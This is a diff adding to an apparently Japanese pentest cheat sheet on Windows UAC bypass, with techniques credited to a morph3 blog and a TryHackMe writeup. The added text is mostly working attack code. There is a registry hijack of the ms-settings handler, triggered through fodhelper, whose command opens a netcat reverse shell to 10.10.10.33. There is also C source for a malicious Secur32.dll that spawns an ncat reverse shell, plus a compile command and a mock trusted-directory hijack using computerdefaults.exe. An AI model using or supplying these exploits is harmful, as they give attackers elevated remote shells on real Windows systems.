@@ -117,3 +117,59 @@ reg delete "HKCU\Environment" /v "windir" /f
 ## 自動化
 
 https://github.com/hfiref0x/UACME
+
+## morph3ブログ
+
+### テクニック１
+
+```ps
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value 'c:\users\morph3\nc.exe -e cmd.exe 10.10.10.33 443' -Force
+
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+```
+
+`fodhelper` を実行（Features on Demand Helper）したら管理者としてコマンドが実行される。
+
+### テクニック２
+
+https://notes.morph3.blog/windows/uac-bypass#technique-2
+
+https://0xb0b.gitbook.io/writeups/tryhackme/2023/avenger#privilege-escalation のソースコード
+
+```c
+#include <windows.h>
+
+void exec_custom()
+{
+	WinExec("c:\\users\\hugo\\Desktop\\ncat.exe -e cmd.exe 10.8.211.1 49732", 1);
+}
+
+bool APIENTRY DllMain( HMODULE hModule,
+			DWORD ul_reason_for_call,
+			LPVOID lpReserved
+		)
+{
+	switch(ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		exec_custom();
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return true;
+}
+```
+
+```sh
+x86_64-w64-mingw32-gcc -shared -o Secur32.dll custom.cpp
+```
+
+```sh
+mkdir "C:\Windows \"
+mkdir "C:\Windows \System32\"
+copy "C:\Windows\System32\computerdefaults.exe" "C:\Windows \System32\computerdefaults.exe"
+copy ".\Secur32.dll" "C:\Windows \System32\Secur32.dll"
+"C:\Windows \System32\computerdefaults.exe"
+```
